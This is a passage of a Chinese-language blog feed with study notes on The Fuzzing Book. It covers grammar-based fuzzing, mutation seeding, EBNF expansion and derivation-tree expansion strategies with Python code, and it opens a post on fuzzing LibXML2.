class="string">&quot;Fun&quot;</span>, <span class="string">&quot;Profit&quot;</span>],</span><br><span class="line">    <span class="string">&quot;&lt;software-property&gt;&quot;</span>: [<span class="string">&quot;Robustness&quot;</span>, <span class="string">&quot;Reliability&quot;</span>, <span class="string">&quot;Security&quot;</span>],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果如下，解释方式其实上面计算器的例子已经很好的说明了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;Fuzzing: Generating Software Tests&#x27;,</span><br><span class="line"> &#x27;Fuzzing: Principles, Techniques and Tools&#x27;,</span><br><span class="line"> &#x27;Generating Software Tests: Breaking Software&#x27;,</span><br><span class="line"> &#x27;Generating Software Tests: Breaking Software for Robustness and Robustness&#x27;,</span><br><span class="line"> &#x27;Generating Software Tests: Principles, Techniques and Tools&#x27;,</span><br><span class="line"> &#x27;Generating Software Tests: Principles, Techniques and Tools for Profit and Fun&#x27;,</span><br><span class="line"> &#x27;Generating Software Tests: Tools and Techniques for Principles, Techniques and Tools&#x27;,</span><br><span class="line"> &#x27;The Fuzzing Book: Breaking Software&#x27;,</span><br><span class="line"> &#x27;The Fuzzing Book: Generating Software Tests for Profit and Profit&#x27;,</span><br><span class="line"> &#x27;The Fuzzing Book: Generating Software Tests for Robustness and Robustness&#x27;&#125;</span><br></pre></td></tr></table></figure><h1 id="结合mutation和grammar"><a href="#结合mutation和grammar" class="headerlink" title="结合mutation和grammar"></a>结合mutation和grammar</h1><p>如果我们将变异和语法结合起来，语法上的生成数据能够生成有效的输入，而变异的数据能够提供一部分的无效输入，能够得到更好，更大的覆盖面。具体的使用方法也很简单，只需要把语法的生成结果作为种子输入到变异内部即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">number_of_seeds = <span class="number">10</span></span><br><span class="line">seeds = [</span><br><span class="line">    simple_grammar_fuzzer(</span><br><span class="line">        grammar=URL_GRAMMAR,</span><br><span class="line">        max_nonterminals=<span class="number">10</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(number_of_seeds)]</span><br><span class="line">seeds</span><br><span class="line">[<span class="string">&#x27;ftps://user:password@www.google.com:80&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;http://cispa.saarland/&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;ftp://www.google.com:42/&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;ftps://user:password@fuzzingbook.com:39?abc=abc&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;https://www.google.com?x33=1&amp;x06=1&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;http://www.google.com:02/&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;https://user:password@www.google.com/&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;ftp://cispa.saarland:8080/?abc=abc&amp;def=def&amp;abc=5&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;http://www.google.com:80/def?def=abc&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;http://user:password@cispa.saarland/&#x27;</span>]</span><br><span class="line"><span class="comment"># 使用之前讲到的变异fuzzer</span></span><br><span class="line">m = MutationFuzzer(seeds)</span><br><span class="line">[m.fuzz() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)]</span><br><span class="line">[<span class="string">&#x27;ftps://user:password@www.google.com:80&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;http://cispa.saarland/&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;ftp://www.google.com:42/&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;ftps://user:password@fuzzingbook.com:39?abc=abc&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;https://www.google.com?x33=1&amp;x06=1&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;http://www.google.com:02/&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;https://user:password@www.google.com/&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;ftp://cispa.saarland:8080/?abc=abc&amp;def=def&amp;abc=5&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;http://www.google.com:80/def?def=abc&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;http://user:password@cispa.saarland/&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;Eh4tp:www.coogle.com:80/def?d%f=abc&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;ftps://&#125;ser:passwod@fuzzingbook.com:9?abc=abc&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;uftp//cispa.sRaarland:808&amp;0?abc=abc&amp;def=defabc=5&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;http://user:paswor9d@cispar.saarland/v&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;ftp://Www.g\x7fogle.cAom:42/&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;hht://userC:qassMword@cispy.csaarland/&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;httx://ww.googlecom:80defde`f=ac&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;htt://cispq.waarlnd/&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;htFtp\t://cmspa./saarna(md/&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;ft:/www.google.com:42\x0f&#x27;</span>]</span><br></pre></td></tr></table></figure><h1 id="grammar-toolbox"><a href="#grammar-toolbox" class="headerlink" title="grammar toolbox"></a>grammar toolbox</h1><h2 id="语法构建程序"><a href="#语法构建程序" class="headerlink" title="语法构建程序"></a>语法构建程序</h2><p>这里主要介绍了一些用来检验、生成(例如正则匹配中的+-？等)的方法。基于的还是python。这里介绍了一个例子BNF，我们需要将他扩充为EBNF，如下所示。实际上就是扩展了一下正则语法。替换了问号、加减等。</p><blockquote><ol><li><p>An expression <code>(content)op</code>, where <code>op</code> is one of <code>?</code>, <code>+</code>, <code>*</code>, becomes <code>&lt;new-symbol&gt;op</code>, with a new rule <code>&lt;new-symbol&gt; ::= content</code>.</p></li><li><p>An expression <code>&lt;symbol&gt;?</code> becomes <code>&lt;new-symbol&gt;</code>, where <code>&lt;new-symbol&gt; ::= &lt;empty&gt; | &lt;symbol&gt;</code>.</p></li><li><p>An expression <code>&lt;symbol&gt;+</code> becomes <code>&lt;new-symbol&gt;</code>, where <code>&lt;new-symbol&gt; ::= &lt;symbol&gt; | &lt;symbol&gt;&lt;new-symbol&gt;</code>.</p></li><li><p>An expression <code>&lt;symbol&gt;*</code> becomes <code>&lt;new-symbol&gt;</code>, where <code>&lt;new-symbol&gt; ::= &lt;empty&gt; | &lt;symbol&gt;&lt;new-symbol&gt;</code></p></li></ol></blockquote><p>接下来讲的其实有点像是编译，大概是符号扩展。书本中提到了实现此方法的三个步骤。第一步是生成新symbol，第二步是将生成的symbol重新表示成我们之前提到的语法的形式。下面是一个例子</p><p><img src="/2022/03/17/fuzzing-6-grammer-fuzzing/image-20220318092644508.png" alt="image-20220318092644508"></p><p>处理完这个之后，我们再用正则匹配问号等，并根据上述规则或者加入新符号，或者替换原本的符号。核心代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> operator == <span class="string">&#x27;?&#x27;</span>:</span><br><span class="line">    grammar[new_sym] = [<span class="string">&quot;&quot;</span>, original_symbol]</span><br><span class="line"><span class="keyword">elif</span> operator == <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">    grammar[new_sym] = [<span class="string">&quot;&quot;</span>, original_symbol + new_sym]</span><br><span class="line"><span class="keyword">elif</span> operator == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">     grammar[new_sym] = [</span><br><span class="line">         original_symbol, original_symbol + new_sym]</span><br></pre></td></tr></table></figure><p>上述三步完成之后，就可以根据正则语法写一些”语法”了。</p><p><img src="/2022/03/17/fuzzing-6-grammer-fuzzing/image-20220318093039588.png" alt="image-20220318093039588"></p><h2 id="语法检查程序"><a href="#语法检查程序" class="headerlink" title="语法检查程序"></a>语法检查程序</h2><p>这个有点过于复杂。牵涉到reachable和unreachable，并且检查语法合法性。这里后面有时间看的时候再进一步详细补充原理。总感觉相当于写了一个小编译器或者小解释器的感觉。</p><h1 id="efficient-grammar-fuzzing"><a href="#efficient-grammar-fuzzing" class="headerlink" title="efficient grammar fuzzing"></a>efficient grammar fuzzing</h1><p>这一节介绍了一种用树结构表示变异的方法。用树结构的好处是：能够更清晰的看出变异过程，并且可以相应的控制变异什么时候开始和结束(通过监视变异树)</p><p>在上面提到的简单语法树中，其实存在不少问题。例如下面的输入。在给定<code>max_nonterminals=3</code>的条件下，存在无限父节点的问题。观察第四行。由于我们严格限定了非终止符号长度，因此第四行只能选择<expr>，于是产生了无限父类的错误。</expr></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;&lt;start&gt;&#x27;: [&#x27;&lt;expr&gt;&#x27;],</span><br><span class="line"> &#x27;&lt;expr&gt;&#x27;: [&#x27;&lt;term&gt; + &lt;expr&gt;&#x27;, &#x27;&lt;term&gt; - &lt;expr&gt;&#x27;, &#x27;&lt;term&gt;&#x27;],</span><br><span class="line"> &#x27;&lt;term&gt;&#x27;: [&#x27;&lt;factor&gt; * &lt;term&gt;&#x27;, &#x27;&lt;factor&gt; / &lt;term&gt;&#x27;, &#x27;&lt;factor&gt;&#x27;],</span><br><span class="line"> &#x27;&lt;factor&gt;&#x27;: [&#x27;&lt;sign-1&gt;&lt;factor&gt;&#x27;, &#x27;(&lt;expr&gt;)&#x27;, &#x27;&lt;integer&gt;&lt;symbol-1&gt;&#x27;],</span><br><span class="line"> &#x27;&lt;sign&gt;&#x27;: [&#x27;+&#x27;, &#x27;-&#x27;],</span><br><span class="line"> &#x27;&lt;integer&gt;&#x27;: [&#x27;&lt;digit-1&gt;&#x27;],</span><br><span class="line"> &#x27;&lt;digit&gt;&#x27;: [&#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;],</span><br><span class="line"> &#x27;&lt;symbol&gt;&#x27;: [&#x27;.&lt;integer&gt;&#x27;],</span><br><span class="line"> &#x27;&lt;sign-1&gt;&#x27;: [&#x27;&#x27;, &#x27;&lt;sign&gt;&#x27;],</span><br><span class="line"> &#x27;&lt;symbol-1&gt;&#x27;: [&#x27;&#x27;, &#x27;&lt;symbol&gt;&#x27;],</span><br><span class="line"> &#x27;&lt;digit-1&gt;&#x27;: [&#x27;&lt;digit&gt;&#x27;, &#x27;&lt;digit&gt;&lt;digit-1&gt;&#x27;]&#125;</span><br></pre></td></tr></table></figure><p>除了上述错误之外，这种语法结构也难以控制大小和监视变化。因此，我们通过引入树的结构就能够很好的解决这种问题(简单思考一下就能发现，解决上述问题只需要确保树没有循环指针就可以了)</p><h2 id="语法树定义"><a href="#语法树定义" class="headerlink" title="语法树定义"></a>语法树定义</h2><p>每一次随机选定的终止符与非终止符作为叶节点(注意，类似加减乘除单独作为节点)之后将树展开。前序遍历得到的结果就是当前语法树的输出结果。如下图所示。</p><p><img src="/2022/03/17/fuzzing-6-grammer-fuzzing/image-20220318234420004.png" alt="image-20220318234420004"></p><p>这种结构如何表示呢?使用python</p><h2 id="语法树的表示"><a href="#语法树的表示" class="headerlink" title="语法树的表示"></a>语法树的表示</h2><p>我们用如下结构体表示一个节点</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(SYMBOL_NAME, CHILDREN)</span><br></pre></td></tr></table></figure><p>其中symbol_name如果是非终止符，就一定有叶节点，否则一定没有叶节点。下面是一个很简单的分叉树的表示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DerivationTree = <span class="type">Tuple</span>[<span class="built_in">str</span>, <span class="type">Optional</span>[<span class="type">List</span>[<span class="type">Any</span>]]]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">derivation_tree: DerivationTree = (<span class="string">&quot;&lt;start&gt;&quot;</span>,</span><br><span class="line">                   [(<span class="string">&quot;&lt;expr&gt;&quot;</span>,</span><br><span class="line">                     [(<span class="string">&quot;&lt;expr&gt;&quot;</span>, <span class="literal">None</span>),</span><br><span class="line">                      (<span class="string">&quot; + &quot;</span>, []),</span><br><span class="line">                         (<span class="string">&quot;&lt;term&gt;&quot;</span>, <span class="literal">None</span>)]</span><br><span class="line">                     )])</span><br></pre></td></tr></table></figure><p><img src="/2022/03/17/fuzzing-6-grammer-fuzzing/image-20220318234902745.png" alt="image-20220318234902745"></p><p>注意如果是none，说明在未来还要扩展。否则一个空的list表示为终止符。</p><h2 id="语法树的操作"><a href="#语法树的操作" class="headerlink" title="语法树的操作"></a>语法树的操作</h2><p>有一些比较重要的操作，例如扩展结点。这一步需要首先选定要扩展的节点，其次使用扩展算法。以下方法能够计算在输入一个分叉树时，计算当前可能的扩展数量。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">GrammarFuzzer</span>(<span class="title class_ inherited__">GrammarFuzzer</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">possible_expansions</span>(<span class="params">self, node: DerivationTree</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        (symbol, children) = node</span><br><span class="line">        <span class="keyword">if</span> children <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">sum</span>(self.possible_expansions(c) <span class="keyword">for</span> c <span class="keyword">in</span> children)</span><br></pre></td></tr></table></figure><p>这里可以看到使用了递归来计算能够扩展多少。如果当前children是none，说明到达了结尾，可以返回1，表示这里有一个可以扩展的节点。</p><p>接下来当我们判定当前树存在可扩展的结点之后，就可以进行扩展。关键方法如下（<code>expand_tree_once</code>）。</p><p>下面代码的大致思路是：首先看当前node的子节点是不是none。如果是none就说明到达了可以扩展的节点，使用expand_node扩展当前节点。否则说明当前还在树枝节点上，那么需要以当前节点作为根节点，进一步往下选择任意一个后面可以扩展的节点，选择它并进行<code>expand_tree_once</code>。是一个典型的树操作。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">GrammarFuzzer</span>(<span class="title class_ inherited__">GrammarFuzzer</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">choose_tree_expansion</span>(<span class="params">self,</span></span><br><span class="line"><span class="params">                              tree: DerivationTree,</span></span><br><span class="line"><span class="params">                              children: <span class="type">List</span>[DerivationTree]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Return index of subtree in `children` to be selected for expansion.</span></span><br><span class="line"><span class="string">           Defaults to random.&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> random.randrange(<span class="number">0</span>, <span class="built_in">len</span>(children))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">expand_tree_once</span>(<span class="params">self, tree: DerivationTree</span>) -&gt; DerivationTree:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Choose an unexpanded symbol in tree; expand it.</span></span><br><span class="line"><span class="string">           Can be overloaded in subclasses.&quot;&quot;&quot;</span></span><br><span class="line">        (symbol, children) = tree</span><br><span class="line">        <span class="keyword">if</span> children <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="comment"># Expand this node</span></span><br><span class="line">            <span class="keyword">return</span> self.expand_node(tree)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Find all children with possible expansions</span></span><br><span class="line">        expandable_children = [</span><br><span class="line">            c <span class="keyword">for</span> c <span class="keyword">in</span> children <span class="keyword">if</span> self.any_possible_expansions(c)]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># `index_map` translates an index in `expandable_children`</span></span><br><span class="line">        <span class="comment"># back into the original index in `children`</span></span><br><span class="line">        index_map = [i <span class="keyword">for</span> (i, c) <span class="keyword">in</span> <span class="built_in">enumerate</span>(children)</span><br><span class="line">                     <span class="keyword">if</span> c <span class="keyword">in</span> expandable_children]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Select a random child</span></span><br><span class="line">        child_to_be_expanded = \</span><br><span class="line">            self.choose_tree_expansion(tree, expandable_children)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Expand in place</span></span><br><span class="line">        children[index_map[child_to_be_expanded]] = \</span><br><span class="line">            self.expand_tree_once(expandable_children[child_to_be_expanded])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> tree</span><br></pre></td></tr></table></figure><p>可以用图的方法简明地看到效果。下面是第一次扩展的结果。</p><p><img src="/2022/03/17/fuzzing-6-grammer-fuzzing/image-20220319142232107.png" alt="image-20220319142232107"></p><p>下面是第二次扩展</p><p><img src="/2022/03/17/fuzzing-6-grammer-fuzzing/image-20220319142256145.png" alt="image-20220319142256145"></p><h2 id="优化分叉"><a href="#优化分叉" class="headerlink" title="优化分叉"></a>优化分叉</h2><p>为了监视二叉树的行为，我们加上一些树在expand时候的控制。例如控制树扩展次数和广度。我们首先定义了一个cost用来计算树在扩展时产生的开销。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">GrammarFuzzer</span>(<span class="title class_ inherited__">GrammarFuzzer</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">symbol_cost</span>(<span class="params">self, symbol: <span class="built_in">str</span>, seen: <span class="type">Set</span>[<span class="built_in">str</span>] = <span class="built_in">set</span>(<span class="params"></span>)</span>) \</span><br><span class="line">    -&gt; <span class="type">Union</span>[<span class="built_in">int</span>, <span class="built_in">float</span>]:</span><br><span class="line">        expansions = self.grammar[symbol]</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">min</span>(self.expansion_cost(e, seen | &#123;symbol&#125;) <span class="keyword">for</span> e <span class="keyword">in</span> expansions)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">expansion_cost</span>(<span class="params">self, expansion: Expansion,</span></span><br><span class="line"><span class="params">                       seen: <span class="type">Set</span>[<span class="built_in">str</span>] = <span class="built_in">set</span>(<span class="params"></span>)</span>) -&gt; <span class="type">Union</span>[<span class="built_in">int</span>, <span class="built_in">float</span>]:</span><br><span class="line">        symbols = nonterminals(expansion)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(symbols) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>  <span class="comment"># no symbol</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(s <span class="keyword">in</span> seen <span class="keyword">for</span> s <span class="keyword">in</span> symbols):</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># the value of a expansion is the sum of all expandable variables</span></span><br><span class="line">        <span class="comment"># inside + 1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">sum</span>(self.symbol_cost(s, seen) <span class="keyword">for</span> s <span class="keyword">in</span> symbols) + <span class="number">1</span></span><br></pre></td></tr></table></figure><p>我们定义的规则是：如果当前扩展中含有自己，说明可能潜在的存在无限递归的可能性，设置此时权值为正无穷，否则权值+1。使用symbol_cost能够输出扩展的最小权值。下面是例子</p><p><img src="/2022/03/17/fuzzing-6-grammer-fuzzing/image-20220319150332406.png" alt="image-20220319150332406"></p><p>至此，我们可以有一种选择策略，<strong>每次扩展树时，选择cost最小的扩展，如果都相同，随机选择一个进行扩展</strong></p><blockquote><p>思考：这里就可以把很多图里面有关的算法引入了。有了权值之后我们可以定义最小生成树，或者计算路径等等。可以把每次扩展的权值和覆盖率的提升作比较。可以后面深入思考一下。</p><p>思考一下每次进行最小扩展具有的性质：cost表示的其实是能够最快达到演变结束的路径。也就是说每一次演变，我们朝着<strong>最快达到terminal</strong>的路径。</p></blockquote><p>同样的，为了获得更多可以演变的节点，我们一样可以编写<code>expand_node_max_cost</code>，来让演变变得越来越庞大。那么每一次演变，我们都尽可能朝着能够扩展expr的路径。下图为一个例子</p><p><img src="/2022/03/17/fuzzing-6-grammer-fuzzing/image-20220319160036395.png" alt="image-20220319160036395"></p><p>由上述，我们有了三种扩展策略。</p><blockquote><ol><li><strong>Max cost expansion.</strong> Expand the tree using expansions with maximum cost until we have at least <code>min_nonterminals</code> nonterminals.  This phase can be easily skipped by setting <code>min_nonterminals</code> to zero.</li><li><strong>Random expansion.</strong>  Keep on expanding the tree randomly until we reach <code>max_nonterminals</code> nonterminals.</li><li><strong>Min cost expansion.</strong> Close the expansion with minimum cost.</li></ol></blockquote><p>我们用如下策略来扩展树</p><ol><li>首先调用expand_node_max_cost来获得尽量多的node用来扩展。</li><li>接着expand_random</li><li>最后expand_min来企图快速达到收敛。</li></ol><p>这样就能实现对于任何一种语法树，我们有了控制其发散和收敛的方法。也就不会出现本章一开始提出的问题了。</p>]]></content>
      
      
      <categories>
          
          <category> projects </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzz </tag>
            
            <tag> fuzzing101 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fuzzing-5-parallelize</title>
      <link href="/2022/03/16/fuzzing-5-parallelize/"/>
      <url>/2022/03/16/fuzzing-5-parallelize/</url>
      
        <content type="html"><![CDATA[<p>本次测试对象是LibXML2，目的是发现CVE-2017-9048漏洞。此外，还有fuzzingbook中关于mutation相关知识的学习。</p><span id="more"></span><h1 id="fuzzingbook"><a href="#fuzzingbook" class="headerlink" title="fuzzingbook"></a>fuzzingbook</h1><p>链接一开始说明了一个问题，就是纯随机的变量输入可能要经过非常非常长的时间才能得到一个可能让我们控制流走得更深入的一个输入。(思考一个http://开有的字符串，如果用纯随机，时间将会非常非常漫长)</p><h2 id="变异类型"><a href="#变异类型" class="headerlink" title="变异类型"></a>变异类型</h2><p>一开始，介绍了一些常见的变异类型。包括</p><ol><li>随机删除一个字符</li><li>在随机位置插入一个随机的字符</li><li>将一个随机位置的字符异或上一个随机字符(注意后面这个随机字符一般必须使得异或之后结果还是可见字符)(英文叫flip)</li></ol><p>对于一般的变异类型，如果我们递归的加上新的变异种类，可能得到其他结果。此外，如果叠加了变异次数，也可能得到更多的优秀的变异结果。我们可以创建一个简单的mutationfuzz类，其作用是变异当前的输入，并且在当前输入(seed)用完的情况下，生成新的candidate。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MutationFuzzer</span>(<span class="title class_ inherited__">Fuzzer</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Base class for mutational fuzzing&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed: <span class="type">List</span>[<span class="built_in">str</span>],</span></span><br><span class="line"><span class="params">                 min_mutations: <span class="built_in">int</span> = <span class="number">2</span>,</span></span><br><span class="line"><span class="params">                 max_mutations: <span class="built_in">int</span> = <span class="number">10</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Constructor.</span></span><br><span class="line"><span class="string">        `seed` - a list of (input) strings to mutate.</span></span><br><span class="line"><span class="string">        `min_mutations` - the minimum number of mutations to apply.</span></span><br><span class="line"><span class="string">        `max_mutations` - the maximum number of mutations to apply.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self.seed = seed</span><br><span class="line">        self.min_mutations = min_mutations</span><br><span class="line">        self.max_mutations = max_mutations</span><br><span class="line">        self.reset()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">reset</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Set population to initial seed.</span></span><br><span class="line"><span class="string">        To be overloaded in subclasses.&quot;&quot;&quot;</span></span><br><span class="line">        self.population = self.seed</span><br><span class="line">        self.seed_index = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>可以用以下内容生成新的candidate</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MutationFuzzer</span>(<span class="title class_ inherited__">MutationFuzzer</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_candidate</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Create a new candidate by mutating a population member&quot;&quot;&quot;</span></span><br><span class="line">        candidate = random.choice(self.population)</span><br><span class="line">        trials = random.randint(self.min_mutations, self.max_mutations)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(trials):</span><br><span class="line">            candidate = self.mutate(candidate)</span><br><span class="line">        <span class="keyword">return</span> candidate</span><br></pre></td></tr></table></figure><p>接着，我们就可以直接调用以下的fuzz()来生成一系列变异的输入。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MutationFuzzer</span>(<span class="title class_ inherited__">MutationFuzzer</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fuzz</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">if</span> self.seed_index &lt; <span class="built_in">len</span>(self.seed):</span><br><span class="line">            <span class="comment"># Still seeding</span></span><br><span 